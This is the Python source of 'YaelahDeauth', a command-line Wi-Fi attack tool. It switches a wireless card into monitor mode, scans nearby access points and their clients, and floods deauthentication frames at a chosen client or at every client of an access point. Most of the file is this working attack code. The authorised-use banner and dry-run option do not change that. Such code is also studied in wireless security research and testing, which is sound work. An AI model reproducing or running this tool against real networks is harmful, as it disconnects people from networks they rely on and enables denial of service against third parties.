#!/usr/bin/env python3
import os
import sys
import time
import signal
import json
import csv
import threading
import argparse
from datetime import datetime
from collections import OrderedDict

# Dependency check
try:
    import psutil
    from rich.progress import Progress
    from rich.console import Console
    # These imports will only work if pcap/scapy/npcap are available
    if sys.platform.startswith("win"):
        # On Windows, sniff/send won't work unless special setup (Npcap, admin, etc)
        SCAPY_AVAILABLE = False
    else:
        from scapy.all import *
        SCAPY_AVAILABLE = True
    from mac_vendor_lookup import MacLookup
except ImportError as e:
    print(f"Dependency missing: {e.name}\nInstall: pip install psutil scapy mac-vendor-lookup rich flask")
    sys.exit(1)

VERSION = "2.0.0"
GITHUB_REPO = "arxhr007/wifistrike"

console = Console()
banner = f"""
[bold white]
                      .__         .__    ________                        __  .__     
 ___.__._____    ____ |  | _____  |  |__ \______ \   ____ _____   __ ___/  |_|  |__  
<   |  |\__  \ _/ __ \|  | \__  \ |  |  \ |    |  \_/ __ \\__  \ |  |  \   __\  |  \ 
 \___  | / __ \\  ___/|  |__/ __ \|   Y  \|    `   \  ___/ / __ \|  |  /|  | |   Y  \
 / ____|(____  /\___  >____(____  /___|  /_______  /\___  >____  /____/ |__| |___|  /
 \/          \/     \/          \/     \/        \/     \/     \/                 \/ 
YaelahDeauth — Super Wi-Fi Deauth/Research Tool (v{VERSION})
Author: yaelahrip . Special thanks to ARXHR007
[/bold white]
"""
ethics_warning = "[bold red]!! FOR EDUCATIONAL/AUTHORIZED RESEARCH USE ONLY !!\n!! UNAUTHORIZED USE IS ILLEGAL !![/bold red]"

# Global state
session_log = {"aps": [], "clients": [], "actions": []}
stop_threads = False
allowed_channels = []
dry_run = False
interface_mode_original = {}

# Vendor lookup
try:
    maclookup = MacLookup()
except Exception:
    maclookup = None
    console.print("[yellow]MAC vendor lookup unavailable![/yellow]")

def get_vendor(mac):
    try:
        if maclookup:
            return maclookup.lookup(mac)
    except Exception:
        pass
    return "Unknown"

def get_allowed_channels():
    if sys.platform.startswith("win"):
        # Windows: just return 1-11 as a placeholder
        return list(range(1, 12))
    try:
        import re
        result = os.popen("iw reg get").read()
        allowed = re.findall(r'\((\d{1,2})\)', result)
        if allowed:
            channels = sorted(set(int(ch) for ch in allowed))
            if channels:
                return channels
    except Exception:
        pass
    return list(range(1, 12))

def restore_interface(interface, original_mode=None):
    if sys.platform.startswith("win"):
        # Not supported on Windows
        return
    try:
        import subprocess
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", original_mode or "managed"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=True)
        console.print(f"[green]Restored {interface} to {original_mode or 'managed'} mode.[/green]")
    except Exception:
        console.print(f"[yellow]Warning: Could not restore {interface} mode.[/yellow]")

def signal_handler(sig, frame):
    global stop_threads
    stop_threads = True
    console.print("\n[red]Exiting, cleaning up...[/red]")
    for iface, mode in interface_mode_original.items():
        restore_interface(iface, mode)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def check_root():
    if sys.platform.startswith("linux") or sys.platform.startswith("darwin"):
        # Linux or Mac
        if hasattr(os, "geteuid"):
            if os.geteuid() != 0:
                print("Run as root! Example: sudo python3 super_wifi_tool.py")
                sys.exit(1)
    elif sys.platform.startswith("win"):
        print("Warning: Running on Windows. Most Wi-Fi/monitor/deauth features will NOT work!")
    else:
        print("Unknown platform. Run as administrator/root if possible.")

def check_os():
    if sys.platform.startswith("win"):
        console.print("[yellow]Warning: This tool is best on Linux. Demo mode only on Windows![/yellow]")
    elif sys.platform != "linux":
        console.print("[yellow]Warning: This tool is best on Linux. Reduced features on Mac/BSD![/yellow]")

def list_interfaces():
    return list(psutil.net_if_addrs().keys())

def set_monitor_mode(interface):
    if sys.platform.startswith("win"):
        console.print("[yellow]Monitor mode is NOT supported on Windows. Using demo mode![/yellow]")
        return False
    try:
        import subprocess
        mode = os.popen(f"iwconfig {interface}").read()
        if "Mode:Monitor" in mode:
            return True
        interface_mode_original[interface] = "managed"
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=True)
        console.print(f"[green]{interface} set to monitor mode.[/green]")
        return True
    except Exception as e:
        console.print(f"[red]Failed to set {interface} to monitor: {e}[/red]")
        return False

def set_managed_mode(interface):
    if sys.platform.startswith("win"):
        return True
    try:
        import subprocess
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "managed"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=True)
        console.print(f"[green]{interface} set to managed mode.[/green]")
        return True
    except Exception as e:
        console.print(f"[red]Failed to set {interface} to managed: {e}[/red]")
        return False

def auto_interface():
    # On Windows, just pick the first interface and warn
    interfaces = list_interfaces()
    if not interfaces:
        console.print("[red]No network interfaces found![/red]")
        sys.exit(1)
    if sys.platform.startswith("win"):
        console.print("[yellow]Auto-picking first interface (Windows: monitor/deauth won't work).[/yellow]")
        return interfaces[0]
    for iface in interfaces:
        if set_monitor_mode(iface):
            return iface
    console.print("[red]No interface could be set to monitor mode![/red]")
    sys.exit(1)

def print_aps(aps):
    for idx, ap in enumerate(aps):
        console.print(f"[cyan]{idx+1}[/cyan]  [yellow]{ap['ssid']}[/yellow] | [green]{ap['bssid']}[/green] | Channel: [magenta]{ap['channel']}[/magenta] | Signal: {ap['signal']} | Vendor: {ap['vendor']} | Crypto: {ap['crypto']}")

def scan_wifi(interface, scan_band="2.4"):
    """Scan for Wi-Fi APs."""
    global stop_threads
    aps = []
    aps_dict = OrderedDict()
    allowed = allowed_channels if allowed_channels else get_allowed_channels()
    stop_threads = False

    if sys.platform.startswith("win") or not SCAPY_AVAILABLE:
        console.print("[yellow]Wi-Fi scanning is not supported on Windows or without Scapy/pcap! Showing DEMO APs.[/yellow]")
        # Just fake some APs for demo purposes
        demo_aps = [
            {"ssid": "DemoNet", "bssid": "AA:BB:CC:DD:EE:01", "channel": 1, "signal": -40, "vendor": "DemoCorp", "crypto": "WPA2", "timestamp": str(datetime.now())},
            {"ssid": "TestAP", "bssid": "AA:BB:CC:DD:EE:02", "channel": 6, "signal": -55, "vendor": "TestVendor", "crypto": "WPA2", "timestamp": str(datetime.now())},
        ]
        session_log["aps"].extend(demo_aps)
        print_aps(demo_aps)
        return demo_aps

    def channel_hopper():
        chidx = 0
        while not stop_threads:
            ch = allowed[chidx % len(allowed)]
            os.system(f"iwconfig {interface} channel {ch} >/dev/null 2>&1")
            time.sleep(0.3)
            chidx += 1

    def handler(pkt):
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode(errors='ignore') if pkt.haslayer(Dot11Elt) else "<hidden>"
            signal = getattr(pkt, 'dBm_AntSignal', "N/A")
            stats = pkt[Dot11Beacon].network_stats() if pkt.haslayer(Dot11Beacon) else {}
            channel = stats.get("channel", "N/A")
            crypto = stats.get("crypto", "N/A")
            vendor = get_vendor(bssid)
            if bssid and bssid not in aps_dict:
                ap_entry = {
                    "ssid": ssid, "bssid": bssid, "channel": channel, "signal": signal,
                    "vendor": vendor, "crypto": crypto, "timestamp": str(datetime.now())
                }
                aps_dict[bssid] = ap_entry
                session_log["aps"].append(ap_entry)
                print_aps([ap_entry])

    console.print(f"[bold green]Scanning Wi-Fi on {interface} ({scan_band}GHz band)[/bold green]")
    ch_thread = threading.Thread(target=channel_hopper, daemon=True)
    ch_thread.start()
    try:
        sniff(iface=interface, prn=handler, timeout=15, stop_filter=lambda x: stop_threads)
    except KeyboardInterrupt:
        stop_threads = True
    finally:
        stop_threads = True
        ch_thread.join(timeout=1)
    return list(aps_dict.values())

def scan_clients(interface, bssid):
    """Scan for clients connected to given AP."""
    clients = OrderedDict()
    if sys.platform.startswith("win") or not SCAPY_AVAILABLE:
        console.print("[yellow]Client scanning is not supported on Windows or without Scapy/pcap! Showing DEMO clients.[/yellow]")
        demo_clients = [
            {"mac": "11:22:33:44:55:66", "signal": -40, "vendor": "DemoInc", "timestamp": str(datetime.now())},
            {"mac": "22:33:44:55:66:77", "signal": -55, "vendor": "Sample", "timestamp": str(datetime.now())}
        ]
        session_log["clients"].extend(demo_clients)
        for cl in demo_clients:
            console.print(f"[yellow]Client detected:[/yellow] {cl['mac']} (Vendor: {cl['vendor']}) Signal: {cl['signal']}")
        return demo_clients

    def handler(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 2:
            dst = pkt.addr1
            src = pkt.addr2
            if pkt.addr3 == bssid and src and src not in clients:
                vendor = get_vendor(src)
                signal = getattr(pkt, 'dBm_AntSignal', "N/A")
                client = {"mac": src, "signal": signal, "vendor": vendor, "timestamp": str(datetime.now())}
                clients[src] = client
                session_log["clients"].append(client)
                console.print(f"[yellow]Client detected:[/yellow] {src} (Vendor: {vendor}) Signal: {signal}")

    console.print(f"[bold green]Scanning for clients on {bssid}[/bold green]")
    try:
        sniff(iface=interface, prn=handler, timeout=20)
    except KeyboardInterrupt:
        pass
    return list(clients.values())

def export_log(fmt="json"):
    filename = f"wifi_session_{int(time.time())}.{fmt}"
    with open(filename, "w", newline='') as f:
        if fmt == "json":
            json.dump(session_log, f, indent=2)
        elif fmt == "csv":
            writer = csv.writer(f)
            writer.writerow(["Type","SSID","BSSID","MAC","Channel","Signal","Vendor","Crypto","Timestamp"])
            for ap in session_log["aps"]:
                writer.writerow(["AP", ap['ssid'], ap['bssid'],"", ap['channel'], ap['signal'], ap['vendor'], ap['crypto'], ap['timestamp']])
            for cl in session_log["clients"]:
                writer.writerow(["Client", "", "", cl['mac'], "", cl['signal'], cl['vendor'], "", cl['timestamp']])
    console.print(f"[green]Session exported as {filename}[/green]")

def deauth(target_mac, bssid, interface, count=100, interval=0.1, dry_run=False):
    if sys.platform.startswith("win") or not SCAPY_AVAILABLE:
        console.print("[yellow]Deauth is NOT supported on Windows. Dry-run mode only![/yellow]")
        return
    if dry_run:
        console.print(f"[cyan]Dry-run mode: Would send deauth to {target_mac} from {bssid} on {interface} x{count}[/cyan]")
        return
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    try:
        with Progress() as progress:
            task = progress.add_task("[red]Sending deauth...", total=count)
            for _ in range(count):
                sendp(frame, iface=interface, count=1, inter=interval, verbose=0)
                progress.advance(task)
                if stop_threads:
                    break
    except KeyboardInterrupt:
        console.print("[yellow]Deauth interrupted![/yellow]")
    finally:
        session_log["actions"].append({"type": "deauth", "target": target_mac, "bssid": bssid, "count": count, "timestamp": str(datetime.now())})

def beacon_flood_stub():
    console.print("[red]Beacon/probe flood not implemented yet (stub).[/red]")

def handshake_capture_stub():
    console.print("[red]Handshake/PMKID capture not implemented yet (stub).[/red]")

def flask_dashboard_stub():
    console.print("[red]Web dashboard not implemented yet (stub).[/red]")

def main_menu(interface):
    global dry_run
    while True:
        console.print(banner)
        console.print(ethics_warning)
        console.print(f"[bold blue]Main Menu — Choose Action:[/bold blue]")
        print(f"""
  [green]1.[/green] Scan Wi-Fi (APs)
  [green]2.[/green] Scan Clients on AP
  [green]3.[/green] Deauth Client
  [green]4.[/green] Deauth All (broadcast) [yellow]⚠️ Confirmed[/yellow]
  [green]5.[/green] Export Session Log
  [green]6.[/green] Toggle Dry-Run Mode ({'ON' if dry_run else 'OFF'})
  [green]7.[/green] Advanced: Handshake/PMKID Capture (stub)
  [green]8.[/green] Advanced: Beacon Flood/Probe (stub)
  [green]9.[/green] Launch Web Dashboard (stub)
  [green]0.[/green] Quit
        """)
        choice = input("Select option: ").strip()
        if choice == "1":
            aps = scan_wifi(interface)
            if not aps:
                console.print("[yellow]No APs detected![/yellow]")
        elif choice == "2":
            aps = scan_wifi(interface)
            if not aps:
                continue
            print_aps(aps)
            idx = int(input("Select AP #: ")) - 1
            ap = aps[idx]
            clients = scan_clients(interface, ap['bssid'])
            if not clients:
                console.print("[yellow]No clients detected![/yellow]")
        elif choice == "3":
            aps = scan_wifi(interface)
            print_aps(aps)
            idx = int(input("Select AP #: ")) - 1
            ap = aps[idx]
            clients = scan_clients(interface, ap['bssid'])
            if not clients:
                continue
            for i, cl in enumerate(clients):
                console.print(f"[cyan]{i+1}[/cyan] [green]{cl['mac']}[/green] Vendor: {cl['vendor']}")
            cidx = int(input("Select Client #: ")) - 1
            confirm = input(f"Deauth {clients[cidx]['mac']}? [y/N]: ").lower()
            if confirm == "y":
                deauth(clients[cidx]['mac'], ap['bssid'], interface, count=100, dry_run=dry_run)
        elif choice == "4":
            aps = scan_wifi(interface)
            print_aps(aps)
            idx = int(input("Select AP #: ")) - 1
            ap = aps[idx]
            confirm = input(f"[red]DEAUTH ALL on {ap['bssid']}? Are you sure?[/red] [y/N]: ").lower()
            if confirm == "y":
                deauth("ff:ff:ff:ff:ff:ff", ap['bssid'], interface, count=500, dry_run=dry_run)
        elif choice == "5":
            fmt = input("Export format (json/csv)? ").strip().lower()
            if fmt not in ["json", "csv"]:
                fmt = "json"
            export_log(fmt)
        elif choice == "6":
            dry_run = not dry_run
            console.print(f"[green]Dry-run is now {'ON' if dry_run else 'OFF'}[/green]")
        elif choice == "7":
            handshake_capture_stub()
        elif choice == "8":
            beacon_flood_stub()
        elif choice == "9":
            flask_dashboard_stub()
        elif choice == "0":
            break
        else:
            continue

def cli_automation(args, interface):
    # --cli full automation mode
    if args.scan_wifi:
        aps = scan_wifi(interface)
        if args.export:
            export_log(args.export)
    elif args.scan_clients and args.ap:
        clients = scan_clients(interface, args.ap)
        if args.export:
            export_log(args.export)
    elif args.deauth and args.ap and args.client:
        deauth(args.client, args.ap, interface, count=args.count, dry_run=args.dry_run)
    elif args.deauth_all and args.ap:
        deauth("ff:ff:ff:ff:ff:ff", args.ap, interface, count=args.count, dry_run=args.dry_run)
    # add more as needed

def main():
    check_root()
    check_os()
    console.print(banner)
    console.print(ethics_warning)
    parser = argparse.ArgumentParser(description="Super Wi-Fi Tool (EDU/AUTHORIZED USE ONLY)")
    parser.add_argument("--cli", action="store_true", help="Enable CLI batch/automation mode")
    parser.add_argument("--interface", type=str, help="Interface to use (else auto)")
    parser.add_argument("--scan_wifi", action="store_true", help="Scan for APs (CLI mode)")
    parser.add_argument("--scan_clients", action="store_true", help="Scan clients on AP (CLI mode, needs --ap)")
    parser.add_argument("--deauth", action="store_true", help="Deauth client (CLI, needs --ap and --client)")
    parser.add_argument("--deauth_all", action="store_true", help="Deauth ALL clients on AP (needs --ap)")
    parser.add_argument("--ap", type=str, help="BSSID/AP for client scan/deauth")
    parser.add_argument("--client", type=str, help="Client MAC to deauth")
    parser.add_argument("--count", type=int, default=100, help="Deauth packet count")
    parser.add_argument("--export", type=str, help="Export session to format (json/csv)")
    parser.add_argument("--dry_run", action="store_true", help="Dry-run mode (no real deauth sent)")
    args = parser.parse_args()

    global allowed_channels
    allowed_channels = get_allowed_channels()
    if not allowed_channels:
        allowed_channels = list(range(1, 12))
    interface = args.interface if args.interface else auto_interface()
    set_monitor_mode(interface)

    try:
        if args.cli:
            cli_automation(args, interface)
        else:
            main_menu(interface)
    except Exception as e:
        console.print(f"[red]Fatal error: {e}[/red]")
    finally:
        restore_interface(interface)

if __name__ == "__main__":
    main()
